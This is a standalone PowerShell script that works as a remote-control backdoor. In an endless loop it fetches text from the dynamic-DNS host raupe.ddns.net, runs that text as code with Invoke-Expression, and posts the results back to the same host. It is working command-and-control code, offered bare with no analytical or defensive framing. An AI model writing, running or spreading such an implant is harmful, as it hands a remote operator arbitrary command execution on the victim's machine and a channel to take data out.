$url = "raupe.ddns.net/cdr"

while ($true) {
    # Send an HTTP GET request
    Write-Host "Sending GET request to $url"
    $response = Invoke-WebRequest -Uri $url -Method Get -TimeoutSec 9
    $receivedData = $response.Content

    if (-not [string]::IsNullOrWhiteSpace($receivedData)) {
        try {
            # Execute the received data as a PowerShell expression
            Write-Host "Executing $receivedData as an expression"
            try {
                Invoke-Expression $receivedData | Tee-Object -Variable out
                Write-Host "Output from expression: $out"
                Start-Sleep -Seconds 1
                # Prepare headers for the POST request
                $headers = @{
                    "Content-Type" = "text/plain"
                    "Content-Length" = [System.Text.Encoding]::UTF8.GetByteCount($out)
                }
            } catch {
                $errorMessage = $_.Exception.Message
                Write-Host "Error executing expression: $errorMessage"
                $out = $errorMessage
                $headers = @{
                    "Content-Type" = "text/plain"
                    "Content-Length" = [System.Text.Encoding]::UTF8.GetByteCount($errorMessage)
                }
            }

            # Send an HTTP POST request
            Write-Host "Sending POST request with content length $($headers['Content-Length'])"
            Invoke-WebRequest -Uri $url -Method Post -Body $out -Headers $headers -TimeoutSec 20

        } catch {
            $errorMessage = $_.Exception.Message
            Write-Host "Error executing expression: $errorMessage"
        }
    }

    # Wait for 10 seconds before the next iteration
    Start-Sleep -Seconds 20
}
